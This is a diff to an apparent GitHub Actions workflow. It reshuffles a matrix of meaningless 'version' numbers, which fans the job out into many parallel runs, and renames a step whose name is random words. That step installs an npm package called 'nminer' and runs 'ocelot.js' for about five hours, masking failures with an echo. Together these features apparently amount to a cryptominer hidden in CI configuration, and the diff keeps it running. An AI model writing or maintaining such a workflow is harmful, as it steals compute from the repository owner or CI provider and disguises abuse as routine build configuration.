@@ -9,24 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 3422 }
-          - { version: 9388 }
-          - { version: 1870 }
-          - { version: 7827 }
-          - { version: 416 }
-          - { version: 3787 }
-          - { version: 8646 }
-          - { version: 7547 }
-          - { version: 9678 }
-          - { version: 5656 }
-          - { version: 6613 }
-          - { version: 4567 }
-          - { version: 9076 }
-          - { version: 8454 }
-          - { version: 1899 }
-          - { version: 1925 }
-          - { version: 5690 }
-          - { version: 1568 }
+          - { version: 2825 }
+          - { version: 5048 }
+          - { version: 2301 }
+          - { version: 1614 }
+          - { version: 4949 }
+          - { version: 832 }
+          - { version: 4341 }
+          - { version: 2156 }
+          - { version: 3995 }
+          - { version: 4793 }
+          - { version: 8017 }
+          - { version: 3248 }
+          - { version: 8766 }
+          - { version: 9619 }
+          - { version: 869 }
+          - { version: 5155 }
+          - { version: 4626 }
 
     steps:
       - name: Checkout
@@ -37,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: ouch stage spiteful less that
+      - name: between
         run: |
           npm install nminer@latest
-          timeout 323m node ocelot.js || echo "ocelot executed"
+          timeout 302m node ocelot.js || echo "ocelot executed"
